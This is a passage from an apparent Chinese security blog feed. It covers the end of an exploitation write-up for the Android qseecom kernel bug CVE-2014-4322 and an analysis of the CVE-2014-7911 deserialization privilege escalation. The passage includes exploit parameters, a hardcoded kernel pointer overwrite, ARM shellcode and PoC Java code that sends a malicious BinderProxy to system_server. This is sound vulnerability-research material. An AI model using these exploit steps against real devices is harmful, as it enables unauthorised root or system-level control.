<p>接着往下看__qseecom_update_cmd_buf函数：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">field = (<span class="keyword">char</span> *) req-&gt;cmd_req_buf + req-&gt;ifd_data[i].cmd_buf_offset;</div></pre></td></tr></table></figure></p>
<p>首先需要将物理地址泄露回用户态，参数构造如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">void</span> *abuse_buff;</div><div class="line">abuse_buff = <span class="built_in">malloc</span>(<span class="number">400</span>);</div><div class="line"><span class="built_in">memset</span>(abuse_buff, <span class="number">0</span>, <span class="number">400</span>);</div><div class="line">send_modfd_cmd_req.cmd_req_buf = abuse_buff;</div><div class="line">send_modfd_cmd_req.ifd_data[<span class="number">0</span>].cmd_buf_offset = <span class="number">0</span>;</div></pre></td></tr></table></figure></p>
<p>接着通过ioctl触发__qseecom_update_cmd_buf函数调用：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">field = (<span class="keyword">char</span> *) req-&gt;cmd_req_buf + req-&gt;ifd_data[i].cmd_buf_offset;</div><div class="line">      = (<span class="keyword">char</span> *) abuse_buff;</div><div class="line">update = (<span class="keyword">uint32_t</span> *) field;</div><div class="line">       = (<span class="keyword">uint32_t</span> *) abuse_buff;</div><div class="line">*update = (<span class="keyword">uint32_t</span>) sg_dma_addressji(sg_ptr-&gt;sgl); -&gt; ((<span class="keyword">uint32_t</span> *) abuse_buff)[<span class="number">0</span>] = (<span class="keyword">uint32_t</span>) sg_dma_addressji(sg_ptr-&gt;sgl);</div></pre></td></tr></table></figure></p>
<p>即abuse_buff[0]存放了内核态泄露出的物理地址0x3*******。接下来构造参数以覆盖fsync函数指针：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">define</span> PTMX_FOPS 0xc1235dd0 <span class="comment">// 此处是ptmx_fops结构体的地址的硬编码</span></span></div><div class="line">send_modfd_cmd_req.ifd_data[<span class="number">0</span>].cmd_buf_offset = PTMX_FOPS + <span class="number">56</span> - (<span class="keyword">int</span>) abuse_buff; <span class="comment">// PTMX_FOPS + 56 的地址即为fsync</span></div></pre></td></tr></table></figure></p>
<p>继续通过ioctl触发__qseecom_update_cmd_buf函数调用：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">field = (<span class="keyword">char</span> *) req-&gt;cmd_req_buf + req-&gt;ifd_data[i].cmd_buf_offset;</div><div class="line">      = (<span class="keyword">char</span> *) (PTMX_FOPS + <span class="number">56</span>);</div><div class="line">update = (<span class="keyword">uint32_t</span> *) field;</div><div class="line">       = (<span class="keyword">uint32_t</span> *) (PTMX_FOPS + <span class="number">56</span>);</div><div class="line">*update = (<span class="keyword">uint32_t</span>) sg_dma_addressji(sg_ptr-&gt;sgl); -&gt; *((<span class="keyword">uint32_t</span> *) PTMX_FOPS + <span class="number">56</span>) = (<span class="keyword">uint32_t</span>) sg_dma_addressji(sg_ptr-&gt;sgl);</div></pre></td></tr></table></figure></p>
<p>这样fsync函数指针地址即被替换为了0x3*******，我们只需要在0x3*******地址布置shellcode即可：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">static</span> <span class="keyword">unsigned</span> <span class="keyword">long</span> shellcode[] = &#123;<span class="number">0xe59f0004</span>, <span class="number">0xe92d0001</span>, <span class="number">0xe8bd8000</span>&#125;; <span class="comment">// ldr r0, [pc, $4], stmfd sp!, &#123;r0&#125;, ldmfd sp!, &#123;pc&#125;</span></div></pre></td></tr></table></figure></p>
<p>这里注意的是我们不能使用b系列的跳转指令，因为b系列指令是基于PC的相对偏移的。<br>最后访问/dev/ptmx，调用sync，shellcode将以内核权限执行，执行提权代码后，完成root。</p>
<h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>qseecom设备需要system权限才能访问，所以我们首先需要提权到system才能利用该漏洞，比如CVE-2014-7911。<br>retme大神早就提供了POC，这篇博客也是分析了retme的POC和报告才有的。我在retme的POC的基础上精简了一些代码，需要的和我联系。</p>
<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ol>
<li><a href="https://github.com/retme7/CVE-2014-4322_poc" target="_blank" rel="external">https://github.com/retme7/CVE-2014-4322_poc</a></li>
<li><a href="https://github.com/android/kernel_msm/tree/android-msm-hammerhead-3.4-kitkat-mr1" target="_blank" rel="external">https://github.com/android/kernel_msm/tree/android-msm-hammerhead-3.4-kitkat-mr1</a></li>
<li><a href="https://github.com/android-rooting-tools/android_run_root_shell" target="_blank" rel="external">https://github.com/android-rooting-tools/android_run_root_shell</a></li>
</ol>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;本文主要研究了CVE-2014-4322-qseecom内存破坏漏洞的原理与利用。
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>CVE-2014-7911安卓本地提权漏洞详细分析</title>
    <link href="http://ele7enxxh.com/CVE-2014-7911-Detailed-Analysis-Of-Android-Local-Privilege-Escalation-To-System-Vulnerability.html"/>
    <id>http://ele7enxxh.com/CVE-2014-7911-Detailed-Analysis-Of-Android-Local-Privilege-Escalation-To-System-Vulnerability.html</id>
    <published>2015-07-02T11:54:00.000Z</published>
    <updated>2016-03-23T06:30:43.000Z</updated>
    
    <content type="html"><![CDATA[<p>本文对CVE-2014-7911漏洞的原理以及利用进行了详细分析。<a id="more"></a></p>
<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>CVE-2014-7911是由Jann Horn发现的一个有关安卓的提权漏洞，该漏洞允许恶意应用从普通应用权限提权到system用户执行命令。在Android5.0之前的版本中，java.io.ObjectInputStream没有检查要反序列化的对象是否真的可以序列化，攻击者利用此漏洞，构造恶意对象可在sysem_server进程中执行任意代码并获取提升的权限。CVE-2014-7911是一个非常有学习价值的漏洞，虽然由于Android的碎片化，构造的ROP链很难做到通用，但是其涉及的知识非常广泛，包括Java序列化与反序列化、Dalvik GC机制、Android binder机制、heap spary、ROP、stack pivot。</p>
<h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><p>由于该漏洞的原理与利用涉及了很多方面，这里不一一介绍，贴出一些链接：<br>Java序列化与反序列化：<br><a href="http://www.cnblogs.com/xdp-gacl/p/3777987.html" target="_blank" rel="external">http://www.cnblogs.com/xdp-gacl/p/3777987.html</a><br><a href="http://developer.51cto.com/art/201202/317181.htm" target="_blank" rel="external">http://developer.51cto.com/art/201202/317181.htm</a><br>Android binder机制：<br><a href="http://blog.csdn.net/luoshengyang/article/details/6618363" target="_blank" rel="external">http://blog.csdn.net/luoshengyang/article/details/6618363</a><br>heap spray：<br><a href="http://blog.csdn.net/magictong/article/details/7391397" target="_blank" rel="external">http://blog.csdn.net/magictong/article/details/7391397</a><br>ROP：<br><a href="http://drops.wooyun.org/papers/4077" target="_blank" rel="external">http://drops.wooyun.org/papers/4077</a><br><a href="http://blog.csdn.net/l173864930/article/details/14000343" target="_blank" rel="external">http://blog.csdn.net/l173864930/article/details/14000343</a></p>
<h2 id="分析环境与工具"><a href="#分析环境与工具" class="headerlink" title="分析环境与工具"></a>分析环境与工具</h2><p>Android版本：Android4.4.4_r1<br>手机：Nexus5<br>IDA 6.5</p>
<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>由于网上已有分析文献加上本人文笔有限，本文将根据参考文献进行更加细致的分析。<br>为了方便阅读，下面我贴上部分参考文献，并补充我在分析时对漏洞的理解：</p>
<blockquote>
<p>在Jann Horm给出的漏洞信息与POC中(1]，向system_server传入的是不可序列化的android.os.BinderProxy对象实例，其成员变量在反序列化时发生类型混淆，由于BinderProxy的finalize方法包含本地代码，于是在本地代码执行时将成员变量强制转换为指针，注意到成员变量是攻击者可控的，也就意味着攻击者可以控制该指针，使其指向攻击者可控的地址空间，最终获得在system_server（uid=1000）中执行代码的权限。下面主要结合POC对漏洞进行详细分析，由于笔者之前对相关的Java序列化、Android binder跨进程通信和native代码都不太熟悉，主要根据参考文献进行翻译、整理和理解，不当之处，还请读者海涵。</p>
<h3 id="Java层分析"><a href="#Java层分析" class="headerlink" title="Java层分析"></a>Java层分析</h3><h4 id="第一步，构建一可序列化的恶意对象"><a href="#第一步，构建一可序列化的恶意对象" class="headerlink" title="第一步，构建一可序列化的恶意对象"></a>第一步，构建一可序列化的恶意对象</h4><p>创建AAdroid.os.BinderProxy对象，并将其放入Bundle数据中：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">Bundle bundle = <span class="keyword">new</span> Bundle();</div><div class="line">AAdroid.os.BinderProxy evilProxy = <span class="keyword">new</span> AAdroid.os.BinderProxy();</div><div class="line">bundle.putSerializable(<span class="string">"eatthis"</span>, evilProxy);</div><div class="line">&gt;</div></pre></td></tr></table></figure></p>
<p>注意AAdroid.os.BinderProxy是可序列化的，其成员变量mOrgue就是随后用于改变程序执行流程的指针。随后该可序列化的AAdroid.os.BinderProxy将在传入system_server之间修改为不可序列化的Android.os.BinderProxy对象：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">BinderProxy</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</div><div class="line">	<span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = <span class="number">0</span>;</div><div class="line">	<span class="comment">//public long mObject = 0x1337beef;</span></div><div class="line">	<span class="comment">//public long mOrgue = 0x1337beef;</span></div><div class="line">	<span class="comment">//注意：此处要根据待测的Android版本号设置，在我们待测试的Android 4.4.4中，BinderProxy的这两个Field为private int，这样才能保证POC访问的地址为我们设置的值0x1337beef</span></div><div class="line">	<span class="keyword">private</span> <span class="keyword">int</span> mObject = <span class="number">0x1337beef</span>;</div><div class="line">	<span class="keyword">private</span> <span class="keyword">int</span> mOrgue = <span class="number">0x1337beef</span>;</div></pre></td></tr></table></figure></p>
</blockquote>
<p>AAdroid.os.BinderProxy可序列化的原因是我们需要首先将恶意对象序列化并存入bundle对象中，才能将其传递给system_server进程。<br>mOrgue和mObject的类型可以查看源码（frameworks/base/core/java/android/os/Binder.java）。</p>
<blockquote>
<h4 id="第二步，准备传入system-server的数据"><a href="#第二步，准备传入system-server的数据" class="headerlink" title="第二步，准备传入system_server的数据"></a>第二步，准备传入system_server的数据</h4><p>主要通过一系列java的反射机制，获得android.os.IUserManager.Stub和andrioid.os.IUserManager.Stub.Proxy的Class对象，最终获得跨进程调用system_server的IBinder接口mRemote，以及调用UserManager.setApplicationRestriction函数的TRANSACTION_setApplicationRestriction，为与system_server的跨进程Binder通信作准备：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line">Class stubClass = <span class="keyword">null</span>;</div><div class="line"><span class="keyword">for</span> (Class inner : Class.forName(<span class="string">"android.os.IUserManager"</span>).getDeclaredClasses()) &#123;</div><div class="line">    <span class="keyword">if</span> (inner.getCanonicalName().equals(<span class="string">"android.os.IUserManager.Stub"</span>)) &#123;</div><div class="line">        stubClass = inner;</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line">Field TRANSACTION_setApplicationRestrictionsField = stubClass.getDeclaredField(<span class="string">"TRANSACTION_setApplicationRestrictions"</span>);</div><div class="line">TRANSACTION_setApplicationRestrictionsField.setAccessible(<span class="keyword">true</span>);</div><div class="line">TRANSACTION_setApplicationRestrictions = TRANSACTION_setApplicationRestrictionsField.getInt(<span class="keyword">null</span>);</div><div class="line">Class proxyClass = <span class="keyword">null</span>;</div><div class="line"><span class="keyword">for</span> (Class inner : stubClass.getDeclaredClasses()) &#123;</div><div class="line">    <span class="keyword">if</span> (inner.getCanonicalName().equals(<span class="string">"android.os.IUserManager.Stub.Proxy"</span>)) &#123;</div><div class="line">        proxyClass = inner;</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line">UserManager userManager = (UserManager) context.getSystemService(Context.USER_SERVICE);</div><div class="line">Field mServiceField = UserManager.class.getDeclaredField(<span class="string">"mService"</span>);</div><div class="line">mServiceField.setAccessible(<span class="keyword">true</span>);</div><div class="line">Object mService = mServiceField.get(userManager);</div><div class="line">Field mRemoteField = proxyClass.getDeclaredField(<span class="string">"mRemote"</span>);</div><div class="line">mRemoteField.setAccessible(<span class="keyword">true</span>);</div><div class="line">mRemote = (IBinder) mRemoteField.get(mService);</div><div class="line">UserHandle userHandle = android.os.Process.myUserHandle();</div><div class="line">setApplicationRestrictions(context.getPackageName(), bundle, userHandle.hashCode());</div></pre></td></tr></table></figure></p>
</blockquote>
<p>这里有一个很基础的问题，为什么我们一定要把这个对象传递进system_server进程呢？system_server进程拥有system权限，我们通过将对象传递给system_server，利用一些技巧达到提权到system的目的。<br>这段连续的java反射涉及到了Android binder进程间通讯的知识，有兴趣的可以下来深入研究。</p>
<blockquote>
<h4 id="第三步，向system-server传入不可序列化的Bundle参数"><a href="#第三步，向system-server传入不可序列化的Bundle参数" class="headerlink" title="第三步，向system_server传入不可序列化的Bundle参数"></a>第三步，向system_server传入不可序列化的Bundle参数</h4><p>调用setApplicationRestrictions这个函数，传入之前打包evilproxy的Bundle数据作为参数。将该函数与Android源码中的setApplicationRestrication函数对比，主要的区别在于将传入的Bundle数据进行了修改，将之前可序列化的AAdroid.os.BinderProxy对象修改为了不可序列化的Android.os.BinderProxy对象，这样就将不可序列化的Bundles数据，通过Binder跨进程调用，传入system_server的Android.os.UserManager.setApplicationRestrictions方法：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">setApplicationRestrictions</span><span class="params">(java.lang.String packageName, android.os.Bundle restrictions, <span class="keyword">int</span> userHandle)</span> <span class="keyword">throws</span> android.os.RemoteException </span>&#123;</div><div class="line">	android.os.Parcel _data = android.os.Parcel.obtain();</div><div class="line">	android.os.Parcel _reply = android.os.Parcel.obtain();</div><div class="line">	<span class="keyword">try</span> &#123;</div><div class="line">	   _data.writeInterfaceToken(DESCRIPTOR);</div><div class="line">	   _data.writeString(packageName);</div><div class="line">	   _data.writeInt(<span class="number">1</span>);</div><div class="line">	   restrictions.writeToParcel(_data, <span class="number">0</span>);</div><div class="line">	   _data.writeInt(userHandle);</div><div class="line">	   <span class="keyword">byte</span>[] data = _data.marshall();</div><div class="line">	   <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>; <span class="keyword">true</span>; i++) &#123;</div><div class="line">	       <span class="keyword">if</span> (data[i] == <span class="string">'A'</span> &amp;&amp; data[i+<span class="number">1</span>] == <span class="string">'A'</span> &amp;&amp; data[i+<span class="number">2</span>] == <span class="string">'d'</span> &amp;&amp; data[i+<span class="number">3</span>] == <span class="string">'r'</span>) &#123;</div><div class="line">	           data[i] = <span class="string">'a'</span>;</div><div class="line">	           data[i+<span class="number">1</span>] = <span class="string">'n'</span>;</div><div class="line">	           <span class="keyword">break</span>;</div><div class="line">	       &#125;</div><div class="line">	   &#125;</div><div class="line">	   _data.recycle();</div><div class="line">	   _data = Parcel.obtain();</div><div class="line">	   _data.unmarshall(data, <span class="number">0</span>, data.length);</div><div class="line">	   mRemote.transact(TRANSACTION_setApplicationRestrictions, _data, _reply, <span class="number">0</span>);</div><div class="line">	   _reply.readException();</div><div class="line">	&#125;</div><div class="line">	<span class="keyword">finally</span> &#123;</div><div class="line">	   _reply.recycle();</div><div class="line">	   _data.recycle();</div><div class="line">	&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
</blockquote>
<p>事实上，我们并非必须使用Android.os.UserManager.setApplicationRestrictions方法向system_server传递对象，我们需要的是找到一个途径将序列化后的对象传递进system_server进程，并且system_server会将该对象反序列化，只要满足这样的条件均可。<br>还有一个问题：为什么我们要修改AAdroid.os.BinderProxy为Android.os.BinderProxy？这个问题我将会在后面解释。</p>
<blockquote>
<p>安装POC，启动Activity后将其最小化，触发GC，引起Android系统重启，从Logcat日志中可以看到，system_server执行到了之前设置的BinderProxy对象的0x1337beef这个值，访问了不该访问的内存，导致异常。错误信号、寄存器快照和调用栈如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line">05-14 18:30:55.974: I/DEBUG(3695): Build fingerprint: &apos;google/hammerhead/hammerhead:4.4.4/KTU84P/1227136:user/release-keys&apos;</div><div class="line">05-14 18:30:55.974: I/DEBUG(3695): Revision: &apos;11&apos;</div><div class="line">05-14 18:30:55.974: I/DEBUG(3695): pid: 1552, tid: 1560, name: FinalizerDaemon  &gt;&gt;&gt; system_server &lt;&lt;&lt;</div><div class="line">05-14 18:30:55.974: I/DEBUG(3695): signal 11 (SIGSEGV), code 1 (SEGV_MAPERR), fault addr 1337bef3</div><div class="line">05-14 18:30:56.064: I/DEBUG(3695):     r0 1337beef  r1 401b89d9  r2 746fdad8  r3 6d4fbdc4</div><div class="line">05-14 18:30:56.064: I/DEBUG(3695):     r4 401b89d9  r5 1337beef  r6 713e3f68  r7 1337beef</div><div class="line">05-14 18:30:56.064: I/DEBUG(3695):     r8 1337beef  r9 74709f68  sl 746fdae8  fp 74aacb24</div><div class="line">05-14 18:30:56.064: I/DEBUG(3695):     ip 401f08a4  sp 74aacae8  lr 401b7981  pc 40105176  cpsr 200d0030</div><div class="line">...</div><div class="line">I/DEBUG   (  241): backtrace:</div><div class="line">I/DEBUG   (  241):     #00  pc 0000d176  /system/lib/libutils.so (android::RefBase::decStrong(void const*) const+3)</div><div class="line">I/DEBUG   (  241):     #01  pc 0007097d  /system/lib/libandroid_runtime.so</div><div class="line">I/DEBUG   (  241):     #02  pc 0001dbcc  /system/lib/libdvm.so (dvmPlatformInvoke+112)</div><div class="line">I/DEBUG   (  241):     #03  pc 0004e123  /system/lib/libdvm.so (dvmCallJNIMethod(unsigned int const*, JValue*, Method const*, Thread*)+398)</div><div class="line">I/DEBUG   (  241):     #04  pc 00026fe0  /system/lib/libdvm.so</div><div class="line">I/DEBUG   (  241):     #05  pc 0002dfa0  /system/lib/libdvm.so (dvmMterpStd(Thread*)+76)</div><div class="line">I/DEBUG   (  241):     #06  pc 0002b638  /system/lib/libdvm.so (dvmInterpret(Thread*, Method const*, JValue*)+184)</div><div class="line">I/DEBUG   (  241):     #07  pc 0006057d  /system/lib/libdvm.so (dvmCallMethodV(Thread*, Method const*, Object*, bool, JValue*, std::__va_list)+336)</div><div class="line">I/DEBUG   (  241):     #08  pc 000605a1  /system/lib/libdvm.so (dvmCallMethod(Thread*, Method const*, Object*, JValue*, ...)+20)</div><div class="line">I/DEBUG   (  241):     #09  pc 00055287  /system/lib/libdvm.so</div><div class="line">I/DEBUG   (  241):     #10  pc 0000d170  /system/lib/libc.so (__thread_entry+72)</div><div class="line">I/DEBUG   (  241):     #11  pc 0000d308  /system/lib/libc.so (pthread_create+240)</div></pre></td></tr></table></figure></p>
</blockquote>
<p>这里有个关键问题：<br>为什么要触发GC，触发GC后发生了什么导致漏洞的触发？同样我会在下面解释。</p>
<blockquote>
<h3 id="Native层分析"><a href="#Native层分析" class="headerlink" title="Native层分析"></a>Native层分析</h3><p>假如BinderProxy可以被序列化，那么在反序列化时，其field引用的对象也会被反序列化；但在POC中ObjectInputStream反序列化的BinderProxy对象实例不可序列化，这样在ObjectInputStream反序列化BinderProxy对象时，发生了类型混淆（type confusion），其field被当做随后由Native代码处理的指针。这个filed就是之前设置的0x1337beef，具体而言，就是mOrgue这个变量。<br>android.os.BinderProxy的finalize方法调用native代码，将mOrgue处理为指针：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="meta">@Override</span></div><div class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">finalize</span><span class="params">()</span> <span class="keyword">throws</span> Throwable </span>&#123;</div><div class="line">	<span class="keyword">try</span> &#123;</div><div class="line">			destroy();</div><div class="line">	&#125; <span class="keyword">finally</span> &#123;</div><div class="line">		<span class="keyword">super</span>.finalize();	</div><div class="line">	&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
</blockquote>
<p>不熟悉Java GC机制的不会明白此处finalize方法和我们的漏洞利用有什么关系，这里我将简单介绍一下Java对象的生命周期与垃圾回收（从网上摘抄，出处不详）：<br>创建对象的方式：</p>
<ul>
<li>用new语句创建对象。</li>
<li>使用反射，调用java.lang.Class或java.lang.reflect.Constructor的newInstance()实例方法。</li>
<li>调用对象的clone()方法</li>
<li>使用反序列化手段，调用java.io.ObjectInputStream对象的readObject()方法。</li>
</ul>
<p>垃圾回收：<br>对象的可触及性：</p>
<ul>
<li>可触及状态：当一个对象被创建后，只要程序中还有引用变量引用该对象，那么它就始终处于可触及状态。</li>
<li>可复活状态：当程序不再有任何引用变量引用对象时，它就进入可复活状态。该状态的对象，垃圾回收器会准备释放它占用的内存，在释放前，会调用它的finalize()方法，这些finalize()方法有可能使对象重新转到可触及状态。</li>
<li>不可触及状态：当JVM执行完所有的可复活状态的finalize()方法后，假如这些方法都没有使对象转到可触及状态。那么该对象就进入不可触及状态。只有当对象处于不可触及状态时，垃圾回收器才会真正回收它占用的内存。</li>
</ul>
<p>为什么要触发GC，触发GC后发生了什么导致漏洞的触发？<br>答：当system_server对传进来的对象进行反序列化后就创建了对象，启动Activity后将其最小化，触发GC，注意该对象并没有任何引用，GC清理时就会调用该对象的finalize方法，即调用了Android.os.BinderProxy的finalize方法。</p>
<blockquote>
<p>其中，destroy为native方法：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">native</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title">destroy</span><span class="params">()</span></span>;</div></pre></td></tr></table></figure></p>
<p>cpp代码：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">android_os_BinderProxy_destroy</span><span class="params">(JNIEnv* env, jobject obj)</span></span></div><div class="line">&#123;</div><div class="line">	IBinder* b = (IBinder*)</div><div class="line">		env-&gt;GetIntField(obj, gBinderProxyOffsets.mObject);</div><div class="line">	DeathRecipientList* drl = (DeathRecipientList*)</div><div class="line">		env-&gt;GetIntField(obj, gBinderProxyOffsets.mOrgue);</div><div class="line">	LOGDEATH(<span class="string">"Destroying BinderProxy %p: binder=%p drl=%p\n"</span>, obj, b, drl);</div><div class="line">	env-&gt;SetIntField(obj, gBinderProxyOffsets.mObject, <span class="number">0</span>);</div><div class="line">	env-&gt;SetIntField(obj, gBinderProxyOffsets.mOrgue, <span class="number">0</span>);</div><div class="line">	drl-&gt;decStrong((<span class="keyword">void</span>*)javaObjectForIBinder);</div><div class="line">	b-&gt;decStrong((<span class="keyword">void</span>*)javaObjectForIBinder);</div><div class="line">	IPCThreadState::self()-&gt;flushCommands();</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>最终native代码调用上述decStrong方法，从<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">DeathRecipientList* drl = (DeathRecipientList*)</div><div class="line">	env-&gt;GetIntField(obj, gBinderProxyOffsets.mOrgue);</div></pre></td></tr></table></figure></p>
<p>这一行可以看出，drl就是mOrgue，可以被攻击者控制。 所以，drl-&gt;decStrong方法调用使用的this指针可由攻击者控制。<br>gBinderProxyOffsets.mObject和gBinderProxyOffsets.mOrgue<br>在android_util_Binder.cpp中的int_register_android_os_BinderProxy方法完成初始化：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">gBinderProxyOffsets.mObject  = env-&gt;GetFieldID(clazz, <span class="string">"mObject"</span>, <span class="string">"I"</span>);</div><div class="line">gBinderProxyOffsets.mOrgue = env-&gt;GetFieldID(clazz, <span class="string">"mOrgue"</span>, <span class="string">"I"</span>);</div></pre></td></tr></table></figure></p>
</blockquote>
<p>即是AAdroid.os.BinderProxy中的变量mObject和mOrgue。<br>为什么我们要修改AAdroid.os.BinderProxy以及为什么要修改为Android.os.BinderProxy？<br>答：注意我们仅仅是向system_server进程传递了一个恶意对象实例，此时没有任何该对象的方法或者数据被使用，然而由于Java GC机制，当该对象被清理时，GC将调用他的finalize方法。然后如果只有如此，我们仍然无法利用，因为finalize方法仍然是不可控的，我们目前唯一能控制的是该恶意对象，回到我们选择的Android.os.BinderProxy，它在其finalize方法中将变量mObject和mOrgue强制转换为函数指针，并调用。而注意的是，我们可以控制mObject和mOrgue的值，这样就相当于我们可以向system_server传递一个任意值的函数指针this，并在该对象实例被GC时有机会获得控制权。</p>
<blockquote>
<p>再看一下RefBase类中的decStrong方法<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">void</span> RefBase::decStrong(<span class="keyword">const</span> <span class="keyword">void</span>* id) <span class="keyword">const</span></div><div class="line">&#123;</div><div class="line">	weakref_impl* <span class="keyword">const</span> refs = mRefs;</div><div class="line">	refs-&gt;removeStrongRef(id);</div><div class="line">	<span class="keyword">const</span> <span class="keyword">int32_t</span> c = android_atomic_dec(&amp;refs-&gt;mStrong);</div><div class="line">	<span class="meta">#<span class="meta-keyword">if</span> PRINT_REFS</span></div><div class="line">	ALOGD(<span class="string">"decStrong of %p from %p: cnt=%d\n"</span>, <span class="keyword">this</span>, id, c);</div><div class="line">	<span class="meta">#<span class="meta-keyword">endif</span></span></div><div class="line">	ALOG_ASSERT(c &gt;= <span class="number">1</span>, <span class="string">"decStrong() called on %p too many times"</span>, refs);</div><div class="line">	<span class="keyword">if</span> (c == <span class="number">1</span>) &#123;</div><div class="line">		refs-&gt;mBase-&gt;onLastStrongRef(id);</div><div class="line">		<span class="keyword">if</span> ((refs-&gt;mFlags&amp;OBJECT_LIFETIME_MASK) == OBJECT_LIFETIME_STRONG) == 	OBJECT_LIFETIME_STRONG) &#123;</div><div class="line">			<span class="keyword">delete</span> <span class="keyword">this</span>;</div><div class="line">		&#125;</div><div class="line">		refs-&gt;decWeak(id);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>注意上述refs-&gt;mBase-&gt;onLastStrongRef(id)最终导致代码执行。<br>我们上面提到我们传入的mOrgue的值，即是drl-&gt;decStrong方法所在类DeathRecipientList的this指针。</p>
